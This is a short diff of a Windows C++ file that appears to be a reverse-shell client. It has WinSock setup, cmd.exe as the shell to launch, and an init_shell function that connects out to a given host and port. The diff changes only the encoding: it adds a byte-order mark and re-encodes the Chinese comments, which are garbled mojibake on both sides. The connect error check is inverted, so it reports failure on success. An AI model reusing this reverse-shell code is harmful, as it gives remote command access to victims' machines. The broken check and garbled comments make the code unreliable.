@@ -1,4 +1,4 @@
-#include <WinSock2.h>
+ï»¿#include <WinSock2.h>
 #include <WS2tcpip.h>
 #include <Windows.h>
 #include <iostream>
@@ -10,7 +10,7 @@ PROCESS_INFORMATION process_info;
 sockaddr_in sockaddr_info;
 WCHAR cmd_name[] = L"cmd.exe";
 
-// ¿Í»§¶Ë³ÌĞò
+// å®¢æˆ·ç«¯ç¨‹åº
 void init_shell(char* host, int port) {
 	int timeout = 3000;
 
@@ -25,7 +25,7 @@ void init_shell(char* host, int port) {
 		return;
 	}
 
-	// ÉèÖÃ³¬Ê±
+	// è®¾ç½®è¶…æ—¶
 	setsockopt(
 		socket_handle,
 		SOL_SOCKET,
@@ -34,7 +34,7 @@ void init_shell(char* host, int port) {
 		sizeof(timeout)
 	);
 
-	// Á¬½Ó
+	// è¿æ¥
 	if (!connect(socket_handle, (sockaddr*)&sockaddr_info, sizeof(sockaddr_info))) {
 		std::cout << "socket connect failed: " << WSAGetLastError() << std::endl;
 	}
